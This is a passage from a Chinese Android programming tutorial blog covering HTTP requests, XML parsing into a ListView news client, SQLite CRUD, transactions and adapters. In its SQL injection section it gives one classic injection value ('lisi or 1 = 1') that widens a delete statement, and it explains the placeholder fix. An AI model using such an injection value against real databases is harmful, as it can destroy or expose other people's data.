                    conn.setRequestProperty(&quot;Content-Length&quot;, content.length() + &quot;&quot;);

                    //设置开启客户端的输出流
                    conn.setDoOutput(true);
                    //获取客户端的输出流，客户端可以通过此流把数据传递给服务器
                    OutputStream os = conn.getOutputStream();
                    os.write(content.getBytes());

                    if(conn.getResponseCode() == 200){
                        InputStream is = conn.getInputStream();
                        String text = Tools.getTextFromStream(is);

                        Message msg = handler.obtainMessage();
                        msg.obj = text;
                        handler.sendMessage(msg);
                    }
                } catch (Exception e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        };
        t.start();
    }
}
</code></pre><p>###案例综合：新闻客户端（解析xml,ListView）</p>
<p>public class MainActivity extends Activity {<br>    List<news> newsList;<br>    // 主线程定义信息处理器Handler<br>    Handler handler = new Handler() {<br>        public void handleMessage(android.os.Message msg) {<br>            // 获取ListView布局文件<br>            ListView lv = (ListView) findViewById(R.id.lv);<br>            // 为ListView设置适配器<br>            lv.setAdapter(new MyAdapter());<br>        }<br>    };<br>    @Override<br>    protected void onCreate(Bundle savedInstanceState) {<br>        super.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        // 界面一打开，执行此方法<br>        getNewsInfo();<br>    }<br>    /**</news></p>
<pre><code> * 自定义一个复杂的BaseAdapter
 * 
 * @author Administrator
 */
class MyAdapter extends BaseAdapter {
    @Override
    public int getCount() {
        return newsList.size();
    }
    @Override
    public Object getItem(int position) {
        // TODO Auto-generated method stub
        return null;
    }
    @Override
    public long getItemId(int position) {
        // TODO Auto-generated method stub
        return 0;
    }
    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        View view = null;
        ViewHolder vholder = null;
        News news = newsList.get(position);
        if (convertView == null) {
            // 填充器将一个布局文件，转成view对象
            view = View.inflate(MainActivity.this, R.layout.item_listview,null);
            vholder = new ViewHolder();
            vholder.tv_title = (TextView) view.findViewById(R.id.tv_title);
            vholder.tv_detail = (TextView) view
                    .findViewById(R.id.tv_detail);
            vholder.tv_comment = (TextView) view
                    .findViewById(R.id.tv_comment);
            vholder.siv = (SmartImageView) view.findViewById(R.id.iv);
            // 将vholder封装到view对象中，vholder会和view一起缓存起来
            view.setTag(vholder);
        } else {
            view = convertView;
            vholder = (ViewHolder) view.getTag();
        }
        vholder.tv_title.setText(news.getTitle());
        vholder.tv_detail.setText(news.getDetail());
        vholder.tv_comment.setText(news.getComment() + &quot;条评论&quot;);
        vholder.siv.setImageUrl(news.getImage());
        return view;
    }
    class ViewHolder {
        TextView tv_title;
        TextView tv_detail;
        TextView tv_comment;
        SmartImageView siv;
    }
}
/**
 * 请求查看服务器端xml文件
 */
private void getNewsInfo() {
    Thread t = new Thread(){
        public void run() {
            // 1查看xml文件的网址
            String address = &quot;http://192.168.1.102:8080/news.xml&quot;;
            // 2封装字符串地址成URL
            URL url;
            try {
                url = new URL(address);
                // 3获取连接对象
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                // 4设置请求参数
                conn.setRequestMethod(&quot;GET&quot;);
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(8000);
                // 5
                // 6获取响应码，进行判断
                if (conn.getResponseCode() == 200) {
                    // 拿到服务器返回的流，流里的数据，就是请求的内容
                    InputStream is = conn.getInputStream();
                    // 用pull解析xml
                    parseNewsXml(is);// (第二天讲的Android下,xml数据解析,登录演示中，
                                        // 实现读取之前保存在xml中的数据,并显示到控件上功能)
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };
    t.start();

}
/**
 * 解析xml数据，将数据存到news对象中，将news对象存放到newsList集合中
 * 
 * @param is
 */
private void parseNewsXml(InputStream is) {
    try {
        // 创建xml解析器
        XmlPullParser parser = Xml.newPullParser();
        // 初始化xml解析器，指定解析那个流，以什么编码格式解析
        parser.setInput(is, &quot;UTF-8&quot;);
        // 解析xml数据
        int type = parser.getEventType();// xml标签节点类型
        News news = null;
        while (type != XmlPullParser.END_DOCUMENT) {// 循环结束的条件
            switch (type) {
            case XmlPullParser.START_TAG:
                if (&quot;newslist&quot;.equals(parser.getName())) {
                    newsList = new ArrayList&lt;News&gt;();
                } else if (&quot;news&quot;.equals(parser.getName())) {
                    news = new News();
                } else if (&quot;title&quot;.equals(parser.getName())) {
                    String title = parser.nextText();
                    news.setTitle(title);
                } else if (&quot;detail&quot;.equals(parser.getName())) {
                    String detail = parser.nextText();
                    news.setDetail(detail);
                } else if (&quot;comment&quot;.equals(parser.getName())) {
                    String comment = parser.nextText();
                    news.setComment(comment);
                } else if (&quot;image&quot;.equals(parser.getName())) {
                    String image = parser.nextText();
                    news.setImage(image);
                }
                break;
            case XmlPullParser.END_TAG:
                if (&quot;news&quot;.equals(parser.getName())) {
                    newsList.add(news);
                }
                break;
            }
            type = parser.next();
        }
        // 发送一个消息到消息队列，触发handleMessage()方法
        handler.sendEmptyMessage(0);
    } catch (Exception e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }
}
}
</code></pre>
          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/02/13/03-数据库-弹框/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="yass">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="个人博客">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="个人博客" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/02/13/03-数据库-弹框/" itemprop="url">
                  03 数据库&弹框
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-13T09:43:47+08:00">
                2017-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="一、数据库"><a href="#一、数据库" class="headerlink" title="一、数据库"></a>一、数据库</h1><p>.mdf .access(微软)  .db(Android)</p>
<p>##1.1 一般数据库sql语句(如：MySQL)</p>
<ul>
<li><p>数据库创建</p>
<pre><code>create table person ( 
   _id integer primary key autoincrement, 
   name varchar(20),
   age integer
);
</code></pre></li>
<li><p>插入一条数据</p>
<pre><code>insert into person (name, age) values (&apos;lisi&apos;, 23);
</code></pre></li>
<li><p>删除一条数据</p>
<pre><code>delete from person where name = &apos;lisi&apos;;
</code></pre></li>
<li><p>修改一条数据</p>
</li>
</ul>
<pre><code>update person set age = 18 where name = &apos;zhangsan&apos;;
</code></pre><ul>
<li>查询一条数据</li>
</ul>
<pre><code>select * from person where name = &apos;zhangsan&apos;;
</code></pre><ul>
<li><p>查询多条数据</p>
<pre><code>select * from person;
</code></pre></li>
</ul>
<p>##1.2 语言的发展:<br>机器语言 -&gt; 汇编语言 -&gt; c语言 -&gt; c++ -&gt; java(c+++) -&gt; c#(c++++) -&gt; 自然语言</p>
<p>##1.3  android下数据库:sqlite创建的步骤</p>
<ul>
<li>1.类继承SQLiteOpenHelper（数据创建的帮助类，oncreate,onUpgrade)</li>
<li><p>2.重写oncreate()方法 ，数据库<em>第一次</em>被创建的时候调用的方法。适合数据库表结构的初始化.</p>
<pre><code>create table info (_id integer primary key autoincrement, name varchar(20), phone varchar(20))
</code></pre></li>
<li><p>3.重写onUpgrade()，数据库被更新的时候调用的方法.数据库的版本号增加的时候调用。</p>
</li>
<li>4.添加helper类的构造方法。 指定数据库的名称，版本号，游标工厂默认null</li>
</ul>
<p>注意<br>    情况一: 用户第一次安装应用,只会走oncreate()方法,不走onUpgrade()方法,所以开发者需将所有的表创建都要放在oncreate()中,此时会记录当前数据库版本号(也就是最新的数据库版本号)<br>    情况二: 用户在第一次安装完成后,版本升级不会走oncreate()方法,去走onUpgrade()方法,并根据数据库版本号对数据库进行增删改查<br>import android.content.Context;<br>import android.database.sqlite.SQLiteDatabase;<br>import android.database.sqlite.SQLiteDatabase.CursorFactory;<br>import android.database.sqlite.SQLiteOpenHelper;<br>public class PersonSQLiteOpenHelper extends SQLiteOpenHelper {</p>
<pre><code>/**
 * 把已知的固定值写好(数据库名称,版本号), 外边只传一个Context进来就可以初始化该帮助类了
 * @param context
 */
public PersonSQLiteOpenHelper(Context context){
    // 转调4个参数的构造函数
    this(context, &quot;itheima58.db&quot;, null, 3);
}
/**
 * 创建一个数据库帮助类, 去创建\ 打开\ 管理 数据库.
 * @param context 上下文.
 * @param name 设置数据库名称
 * @param factory  CursorFactory 定义一个结果集, 游标工厂. 
 *                     Cursor 游标(结果集, 保存了对数据库的引用, 指针)
 *                     设置为null表示使用系统默认游标工厂
 * @param version 数据库的版本, 从1开始 &gt;= 1  
 */
public PersonSQLiteOpenHelper(Context context, String name,
        CursorFactory factory, int version) {
    super(context, name, factory, version);
}
/**
 * 当数据库第一次被创建时调用, 这里进行表结构的创建和初始化.
 */
@Override
public void onCreate(SQLiteDatabase db) {
    System.out.println(&quot;PersonSQLiteOpenHelper: onCreate&quot;);

    // 执行创建语句, 创建person表
    db.execSQL(&quot;create table person(_id integer primary key autoincrement, name varchar(20),age integer)&quot;);
}
/**
 * 数据库升级时调用, 在这里做表结构的更新,删除等操作.
 */
@Override
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
    System.out.println(&quot;PersonSQLiteOpenHelper: onUpgrade &quot; + &quot;旧版本号: &quot; + oldVersion + &quot; 新版本号: &quot; + newVersion);

    if(oldVersion == 2 &amp;&amp; newVersion == 3){
        // 版本从2升级到3, 给person表添加一个balance余额字段
        db.execSQL(&quot;alter table person add column balance integer&quot;);
    }    
}
</code></pre><p>}</p>
<p>##1.4数据库文件创建的位置</p>
<ul>
<li>数据库路径:<ul>
<li>/data/data/包名/databases/itheima58.db</li>
<li>数据库在创建的时候不指定里面的内容，默认创建只有一张表 metadata保存系统语言环境。</li>
</ul>
</li>
<li>DAO (Databses Access Object)</li>
</ul>
<p>##1.5 android下数据库增删改查</p>
<ul>
<li>自己写sql语句查询<ul>
<li>void - db.execSQL（） 增删改</li>
<li>cursor - db.rawQuery()  查询</li>
<li>灵活, 级联查询, 执行效率高</li>
</ul>
</li>
<li>系统API查询 (重要)<ul>
<li>方便, 不易出错, 效率稍低</li>
</ul>
</li>
</ul>
<p>##1.6 两种增删改查方法的优缺点</p>
<ul>
<li>自己写sql语句  <ul>
<li>灵活</li>
<li>资源占用小</li>
<li>可以实现表的级联查询</li>
</ul>
</li>
<li>google的现成API<ul>
<li>方便</li>
<li>资源开销比较大</li>
<li>有返回值</li>
</ul>
</li>
</ul>
<p>##1.7 注意：</p>
<pre><code>- 操作数据库 一定要记得把数据库给关闭掉。 
- cursor 用完后，也记得关闭`
</code></pre><ul>
<li>getReadableDatabase（）</li>
<li>getWriteableDatabase（）返回的是同一个数据库的实例，</li>
<li>区别就是数据库返回的时候是否加锁。</li>
</ul>
<p>##1.8 SQL 语句的注入问题及解决</p>
<blockquote>
<p>String name = “lisi or 1 = 1”<br>delete from person where name = lisi or 1 = 1;<br>如何防止, 绑定参数防止注入, 利用占位符号 ?</p>
</blockquote>
<p>##1.9 cmd命令行查看数据库流程:sqlite3</p>
<pre><code>- adb shell 进入控制台
- # cd /data/data/com.itheima.aqlitedb/datebases 进入数据库文件夹
- # ls  展示数据库文件夹中的文件
- # sqlite3 itheima58.db  查看itheima58.db数据库,进入sqlite&gt;模式
- sqlite&gt; .table 查看所有表
- sqlite&gt; select * from person; 查看person表的所有记录
- sqlite&gt; .mode column 设置以列的形式格式化展示
- sqlite&gt; select * from person; 查看person表的所有记录
- sqlite&gt; .exit 退出 
</code></pre><blockquote>
<p>sqlite3 itheima58.db  查看itheima58.db数据库,进入sqlite&gt;模式<br>.table 查看所有表<br>.mode column 设置以列的形式格式化展示<br>.exit 退出  </p>
</blockquote>
<p>##1.10 如果出现中文乱码 需要修改cmd的编码集 65001 utf-8</p>
<blockquote>
<p>chcp 65001  更改cmd窗口的编码，默认是gb2312 </p>
</blockquote>
<p>##1.11 自己写sql语句 </p>
<ul>
<li>void - db.execSQL（） 增删改</li>
<li>cursor - db.rawQuery()  查询</li>
</ul>
<p>-下面缩写的示例都是定义在dao(数据访问层)中，想用那个功能直接调用————–</p>
<ul>
<li><p>插入一条数据, 指定名称和年龄</p>
<pre><code>public void insert(String name, int age) {
    // 获取可写数据库
    SQLiteDatabase db = helper.getWritableDatabase();
    db.execSQL(&quot;insert into person (name, age) values (?, ?)&quot;, new Object[]{name, age});

}
</code></pre></li>
<li><p>根据指定名称删除一条数据</p>
<p>  public void delete(String name) {</p>
<pre><code>SQLiteDatabase db = helper.getWritableDatabase();
db.execSQL(&quot;delete from person where name = ?&quot;, new Object[]{name});
</code></pre><p>  }</p>
</li>
<li><p>修改一条数据, 修改指定人的年龄</p>
<p>  public void update(String name, int age) {</p>
<pre><code>SQLiteDatabase db = helper.getWritableDatabase();
db.execSQL(&quot;update person set age = ? where name = ?&quot;, new Object[]{age, name});
</code></pre><p>  }</p>
</li>
<li><p>查询一条数据</p>
<p>  public void querySingleRecord(String nameArg) {</p>
<pre><code>SQLiteDatabase db = helper.getReadableDatabase();

// ------------------------------------------------- 重点 ↓

// 游标, 对数据库的引用
Cursor cursor = db.rawQuery(&quot;select * from person where name = ?&quot;, new String[]{nameArg});

if(cursor != null &amp;&amp; cursor.moveToFirst()){ // 是否能移动到第一个
    int _id = cursor.getInt(0);
    String name = cursor.getString(1);
    int age = cursor.getInt(2);
    System.out.println(&quot;_id: &quot; + _id + &quot; name: &quot; + name + &quot; age: &quot; + age);
}
// 关闭应用
cursor.close();

// ------------------------------------------------- 以上 ↑

}
</code></pre></li>
<li><p>查询所有数据</p>
<p>  public List<person> queryAll() {</person></p>
<pre><code>SQLiteDatabase db = helper.getReadableDatabase();
Cursor cursor = db.rawQuery(&quot;select * from person&quot;, null);

ArrayList&lt;Person&gt; persons = new ArrayList&lt;Person&gt;();

if(cursor != null &amp;&amp; cursor.getCount() &gt; 0){
    // 循环遍历

    // 获取列数
    int columnCount = cursor.getColumnCount();
    System.out.println(&quot;columnCount: &quot; + columnCount);

    while(cursor.moveToNext()){ // 直到下一个没有数据, 返回false

        // cursor.getColumnIndex(&quot;_id&quot;)// 根据列名获取列的索引

        int _id = cursor.getInt(cursor.getColumnIndex(&quot;_id&quot;));
        String name = cursor.getString(cursor.getColumnIndex(&quot;name&quot;));
        int age = cursor.getInt(cursor.getColumnIndex(&quot;age&quot;));
        Person person = new Person(_id, name, age);
        System.out.println(person.toString());
        persons.add(person);
    }
}
cursor.close();

return persons;
}
</code></pre></li>
</ul>
<p>##1.12 google的现成API操作数据库</p>
<ul>
<li><p>插入一条数据 测试用例注意配置</p>
<ul>
<li>db.insert(“person”, “name”, values);</li>
</ul>
</li>
</ul>
<pre><code>public class PersonDao3 {//dao封装插入功能
    // 通过构造函数 创建数据库 
    private PersonSQLiteOpenHelper helper;
    public PersonDao3(Context context){
        helper = new PersonSQLiteOpenHelper(context);
    }
    /**
     * 插入一条记录，指定姓名和年龄
     * @param name
     * @param age
     */
    public void insert(String name,int age){
        // 获取可写数据库
        SQLiteDatabase db = helper.getWritableDatabase();

        ContentValues values = new ContentValues();
        values.put(&quot;name&quot;, name);
        values.put(&quot;age&quot;,age);

        // nullColumnHack 第二个参数 任意指定表的一个列名, 用来插入一条内容是空的数据
        //若第二个参数填为null，当插入一条内容是空的数据时，会报错
        db.insert(&quot;person&quot;, &quot;name&quot;, values);
        db.close();
    }
}

//测试用例-注意继承AndroidTestCase-----------------
public class TestCase3 extends AndroidTestCase{
    public void testInsert(){
        PersonDao3 dao = new PersonDao3(getContext());
        dao.insert(&quot;zhangsan&quot;, 24);
    }
}
</code></pre><ul>
<li><p>删除一条数据</p>
<ul>
<li><p>db.delete(“person”, “name = ?”, new String[]{name});</p>
<p>  /**</p>
<ul>
<li>根据name字段删除一条记录</li>
<li><p>@param name<br>*/<br>public void delete(String name){<br> //获取可写的数据库<br> SQLiteDatabase db = helper.getWritableDatabase();<br> //根据name字段删除一条记录<br> db.delete(“person”, “name=?”, new String[]{name});<br> db.close();<br>}</p>
<p>//测试Android系统API对数据库的删除功能<br>public void testDelete(){<br> PersonDao3 dao = new PersonDao3(getContext());<br> dao.delete(“zhangsan”);<br>}</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>修改一条数据</p>
<blockquote>
<p>db.update(“person”, values ,”name = ?”, new String[]{name});<br>(参数1：要修改的表，参数2：要修改的值，参数3：判断条件，参数4：条件的参数)</p>
</blockquote>
</li>
</ul>
<pre><code>/**
 * 修改功能：根据表的name字段修改age字段
 * @param name
 * @param age
 */
public void updata(String name,int age){
    //获取可写的数据库
    SQLiteDatabase db = helper.getWritableDatabase();
    ContentValues values = new ContentValues();
    //若修改一条记录中多个字段，则对应字段名，传入对应参数
    values.put(&quot;age&quot;,age);
    db.update(&quot;person&quot;, values, &quot;name=?&quot;, new String[]{name});
    db.close();
}

//测试Android系统API对数据库的修改功能
public void testUpdata(){
    PersonDao3 dao = new PersonDao3(getContext());
    dao.updata(&quot;zhangsan1&quot;,32);
}
</code></pre><ul>
<li><p>查询一条数据</p>
<pre><code>Cursor cursor = db.query(&quot;person&quot;,      // 指定表名
    null,             // 指定要获取的列 , null 所有列
    &quot;name = ?&quot;,     // 选择条件
    new String[]{nameArg}, // 条件的参数
    null,         // 分组
    null,         // 分组
    null);        // 排序
</code></pre></li>
</ul>
<pre><code>public void querySingleRecord(String nameArg){
    //获取可读的数据库
    SQLiteDatabase db = helper.getReadableDatabase();
    Cursor cursor = db.query(&quot;person&quot;,   //指定要查询的表明
            null,//指定要查询的列，null指查询所有字段
            &quot;name=?&quot;,//判断的条件
            new String[]{nameArg}, //条件的参数
            null, //分组
            null, //分组
            null //排序
            );
    if (cursor!=null&amp;&amp;cursor.moveToFirst()) {// 是否能移动到第一个
        int _id = cursor.getInt(0);
        String name = cursor.getString(1);
        int age = cursor.getInt(2);
        System.out.println(&quot;_id: &quot; + _id + &quot; name: &quot; + name + &quot; age: &quot; + age);

    } 
    //关闭应用
    cursor.close();
    db.close();
}

//测试Android系统API对数据库的查询单一记录功能
public void testQuerySingleRecord(){
    PersonDao3 dao = new PersonDao3(getContext());
    dao.querySingleRecord(&quot;zhangsan1&quot;);
}
</code></pre><ul>
<li><p>查询多条数据</p>
<pre><code>Cursor cursor = db.query(&quot;person&quot;, null, null, null, null, null, 
    &quot;_id desc&quot; // 按照_id倒叙排列
);

/**
 * 查询所有数据
 */
public List&lt;Person&gt; queryAll(){
    //获取可读的数据库
    SQLiteDatabase db = helper.getReadableDatabase();
    //查询person表，返回游标
    Cursor cursor = db.query(&quot;person&quot;, null, null, null, null, null, null);
    //创建List集合
    ArrayList&lt;Person&gt; persons = new ArrayList&lt;Person&gt;();

    if (cursor!=null&amp;&amp;cursor.getCount()&gt;0) {
        while (cursor.moveToNext()) {//直到下一个没有数据, 返回false

            int _id = cursor.getInt(cursor.getColumnIndex(&quot;_id&quot;));
            String name = cursor.getString(cursor.getColumnIndex(&quot;name&quot;));
            int age = cursor.getInt(cursor.getColumnIndex(&quot;age&quot;));
            Person p = new Person(_id, name, age);
            persons.add(p);
        }
    }
    //关闭资源
    cursor.close();
    db.close();
    return persons;
}

//测试Android系统API对数据库的查询所有功能
public void testQueryAll(){
    PersonDao3 dao = new PersonDao3(getContext());
    List&lt;Person&gt; persons = dao.queryAll();
}
</code></pre></li>
</ul>
<h2 id="数据库的事务"><a href="#数据库的事务" class="headerlink" title="数据库的事务"></a>数据库的事务</h2><ul>
<li>Transaction</li>
<li><ol>
<li>安全, 转账安全!!!</li>
</ol>
</li>
<li><ol>
<li>效率, 速度快!!!</li>
</ol>
</li>
</ul>
<p>流程:</p>
<pre><code>// 1. 开启事务
db.beginTransaction();

try {
    ...
    处理业务逻辑
    ... 
    // 2. 设置回滚点/成功点 , (要么全成功, 要么全失败) 可以设置多个
    db.setTransactionSuccessful();

} catch (SQLException e) {
    e.printStackTrace();
} finally {
    // 3. 结束事务
    db.endTransaction();
}
</code></pre><hr>
<pre><code>/**
 * 转账安全
 */
public void testTransaction(){
    PersonSQLiteOpenHelper helper = new PersonSQLiteOpenHelper(getContext());
    SQLiteDatabase db = helper.getWritableDatabase();

    // 转账1000
    // xiaozhang  10000 
    // 从xiaozhang账户转1000到xiaosan账户
    // ------------------------------------------------- 重点 ↓

    // 1. 开启事务
    db.beginTransaction();

    try {
        db.execSQL(&quot;update person set balance = balance - 1000 where name = &apos;xiaozhang&apos;&quot;);

        // int result = 10 / 0;

        // xiaosan 0
        db.execSQL(&quot;update person set balance = balance + 1000 where name = &apos;xiaosan&apos;&quot;);

        // 2. 设置回滚点/成功点 , (要么全成功, 要么全失败) 可以设置多个
        db.setTransactionSuccessful();

    } catch (SQLException e) {
        e.printStackTrace();
    } finally {
        // 3. 结束事务
        db.endTransaction();
    }
    // ------------------------------------------------- 以上 ↑
}
</code></pre><hr>
<pre><code>/**
 * 提高效率
 */
public void testTransaction1(){

    PersonSQLiteOpenHelper helper = new PersonSQLiteOpenHelper(getContext());
    SQLiteDatabase db = helper.getWritableDatabase();

    // ------------------------------------------------- 重点 ↓

    // 1. 开启事务
    db.beginTransaction();
    long start = System.currentTimeMillis();
    try {

        for (int i = 0; i &lt; 50; i++) {
            db.execSQL(&quot;insert into person (name, age, balance) values (&apos;wang&quot;+i+&quot;&apos;, &quot;+i+&quot;, 100&quot;+i+&quot;)&quot;);
        }

        // 2. 设置回滚点/成功点 , (要么全成功, 要么全失败) 可以设置多个
        db.setTransactionSuccessful();

    } catch (SQLException e) {
        e.printStackTrace();
    } finally {
        // 3. 结束事务
        db.endTransaction();

        long duration = System.currentTimeMillis() - start;
        System.out.println(&quot;插入10000条数据, 消耗时长: &quot; + duration);
        //不开启事务: 插入10000条数据, 消耗时长: 22198
         //开启事务: 插入10000条数据, 消耗时长: 3655
    }

    // ------------------------------------------------- 以上 ↑
}
</code></pre><p>#二、数据库的内容同步显示到界面（ListView),重点。</p>
<p>##2.1、listview工作的原理</p>
<ul>
<li>mvc 设计模式。<ul>
<li>model      数据模型   Person</li>
<li>view       视图       ListView</li>
<li>controller 控制器     Adapter 数据适配器, 将数据集合以特定的方式组织到界面上</li>
</ul>
</li>
</ul>
<p>##2.2、Listview 使用步骤</p>
<ul>
<li>写ui界面 xml文件 ListView</li>
<li>寻找listview </li>
<li>实现listview的数据适配器 adapter</li>
<li>给listview设置adapter</li>
</ul>
<p>##2.3、扩展内容(非常不重要)： ScrollView 滚动视图/滚动界面 </p>
<pre><code>- (ScrollView写在布局文件中，滚动视图标签中写入线性布局标签，使整个视图可滚动)

        // 1. 查找布局控件
        LinearLayout ll_content = (LinearLayout) findViewById(R.id.ll_content);

        // 2. 准备数据
        PersonDAO3 dao = new PersonDAO3(this);
        List&lt;Person&gt; persons = dao.queryAll();

        // 3. 用代码new出来的控件，给界面添加TextView
        for (int i = 0; i &lt; persons.size(); i++) {
            TextView textView = new TextView(this);
            textView.setText(persons.get(i).toString());
            textView.setTextSize(18);

            // 每次都要创建TextView  OOM
            ll_content.addView(textView);
        }
</code></pre><p>##2.4、开发的时候如何自定义数据适配器将数据库的内容同步显示到界面，实现复杂的ui界面。</p>
<ul>
<li>1.定义listview布局 写ui界面 xml文件 ListView</li>
<li>2.查找listview</li>
<li>3.自定义一个复杂BaseAdapter，把listview数据适配器adapater需要的数据准备好<pre><code>- getCount（）；返回有多少个条目 List.SIZE()  
 - getView（）；返回某个位置的View对象（返回每个条目的view对象）
     - int position 条目的位置
     - View convertView 优化用的
     - ViewGroup parent ==listview item的父容器，其实就是listview
</code></pre>  定义一个xml文件<pre><code>View view = View.inflate(MainActivity.this, R.layout.rl_item, null);
</code></pre>  修改view对象里面子孩子显示的内容<pre><code>view.findViewById();
</code></pre></li>
<li>4.把数据适配器设置给listview</li>
</ul>
<p>##2.5、ListView  列表视图/列表界面 (写在布局文件中)此视图控件通过id获取</p>
<pre><code>- 一旦定义ListView布局，就会出现一屏幕的视图条目，
- 根据每一个视图条目的字体大小不同和手机屏幕大小不同，一屏幕显示的条目个数也不相同，
- 在界面展示时, 一屏幕能放下几条数据, 生成几个View条目
- 在ListView布局下，屏幕能够自行上下滚动，但显示在屏幕上的条目数不变
- 视图条目的位置从零开始
- (如果一屏幕只显示6个视图条目，那么视图条目位置就是从0到5)
- 随着屏幕的上下移动，所显示的条目会变成位置是1到6的条目，2到7的条目
- 屏幕上的每一个条目，都会调用BaseAdapter实现类中的getView()方法。（自己理解的）
- 这是ListView自己完成的功能，
- 而我们要做的就是将每个视图条目都赋上我们从数据库取出来的内容，简单讲就是重写getView()方法。

- 给ListView列表视图设置数据适配器, ListView列表视图此时要向Adapter索取数据，并展示在界面上
</code></pre><p>-2.4示例——————————-</p>
<pre><code>// 1. 查找ListView控件
ListView lv_content = (ListView) findViewById(R.id.lv_content);

// 2. 准备数据
PersonDAO3 dao = new PersonDAO3(this);
persons = dao.queryAll();//返回的是从数据库取出的一个List集合

System.out.println(&quot;persons: &quot; + persons.size());

// 3. 给ListView设置数据适配器, ListView此时要向Adapter索取数据
lv_content.setAdapter(new MyAdapter());

//自定义一个复杂BaseAdapter
class MyAdapter extends BaseAdapter {
    /**
     * 返回有多少个条目
     */
    @Override
    public int getCount() {
        // 返回ListView总共要显示的个数
        return persons.size();
    }

    /**
     * 返回每个位置的条目(返回每个条目的view对象)
     * 一旦ListView设置了Adapter, 就会从这个方法索要View
     * int position 集合的每个位置
     */
    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        System.out.println(&quot;第&quot; + position + &quot;位置第一次初始化, 新建了一个TextView&quot;);

        // position, 条目的位置，要数据View的位置(位置从零开始)
        TextView textView = new TextView(MainActivity.this);
        // 设置文本内容
        textView.setText(persons.get(position).toString());
        // 设置字体大小
        textView.setTextSize(16);

        return textView;
    }

    @Override
    public Object getItem(int position) {
        return null;
    }

    @Override
    public long getItemId(int position) {
        return 0;
    }

}
</code></pre><p>##2.6、SimpleAdapter 简单数据适配器</p>
<ul>
<li>SimpleAdapter适配器 : 显示图片, 文本信息</li>
<li><p>//3. 给ListView设置数据适配器, ListView此时要向Adapter索取数据</p>
<pre><code>lv_content.setAdapter(new SimpleAdapter(context, data, resource, from, to));
</code></pre></li>
<li><p>SimpleAdapter适配器四个参数</p>
<ul>
<li>context参数    上下文</li>
<li>data参数    <ul>
<li>List<map<string,object>&gt; data = new ArrayList<map<string,object>&gt;();</map<string,object></map<string,object></li>
<li>一个Map相当于一个条目，通过向Map中put键值对<string,object>，使此条目好看</string,object></li>
</ul>
</li>
<li>resource参数      布局资源的id 线性布局横向布置，ImageView+TextView</li>
<li>from参数  new String[]{“图标”，”文本”} 数组里面就是Map集合的key值；</li>
<li>to参数   new int[]{}  数组里面就是对应布局里面的ImageView的id和TextView的id</li>
<li>另外:from数组的每个值绑定to数组每个值，一一对应</li>
</ul>
</li>
</ul>
<p>-2.6示例——————————</p>
<pre><code>@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    // 设置界面布局
    setContentView(R.layout.activity_main);

    // 1. 查找控件
    ListView lv_content = (ListView) findViewById(R.id.lv_content);

    // 2. 准备数据

    List&lt;Map&lt;String, Object&gt;&gt; data = new ArrayList&lt;Map&lt;String, Object&gt;&gt;();

    // 填充数据
    data = fillData();

    // 3. 给ListView设置数据适配器, ListView此时要向Adapter索取数据
    lv_content.setAdapter(new SimpleAdapter(this, // 上下文
            data,   // 封装了数据的集合
            R.layout.item_listview, 
            new String[]{&quot;图片内容&quot;, &quot;文本内容&quot;}, 
            new int[]{R.id.iv_header, R.id.tv_name}));

}

private List&lt;Map&lt;String, Object&gt;&gt; fillData() {
    ArrayList&lt;Map&lt;String, Object&gt;&gt; arrays = new ArrayList&lt;Map&lt;String, Object&gt;&gt;();

    Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;();
    map.put(&quot;图片内容&quot;, R.drawable.f000);
    map.put(&quot;文本内容&quot;, &quot;大笑&quot;);
    arrays.add(map);

    map = new HashMap&lt;String, Object&gt;();
    map.put(&quot;图片内容&quot;, R.drawable.f001);
    map.put(&quot;文本内容&quot;, &quot;调皮&quot;);
    arrays.add(map);

    map = new HashMap&lt;String, Object&gt;();
    map.put(&quot;图片内容&quot;, R.drawable.f002);
    map.put(&quot;文本内容&quot;, &quot;冷汗&quot;);
    arrays.add(map);

    map = new HashMap&lt;String, Object&gt;();
    map.put(&quot;图片内容&quot;, R.drawable.f003);
    map.put(&quot;文本内容&quot;, &quot;偷笑&quot;);
    arrays.add(map);

    map = new HashMap&lt;String, Object&gt;();
    map.put(&quot;图片内容&quot;, R.drawable.f004);
    map.put(&quot;文本内容&quot;, &quot;拜拜&quot;);
    arrays.add(map);

    return arrays;
}
还有两个layout布局文件没粘过来
1.activity_main.xml中定义ListView布局
2.item_listview.xml中定义LinearLayout布局，横向设置，添加ImageView，TextView视图
</code></pre><p>##2.7、ArrayAdapter 数组适配器</p>
<ul>
<li><p>ArrayAdapter : 只能设置文字</p>
<pre><code>//第一个参数 this 上下文
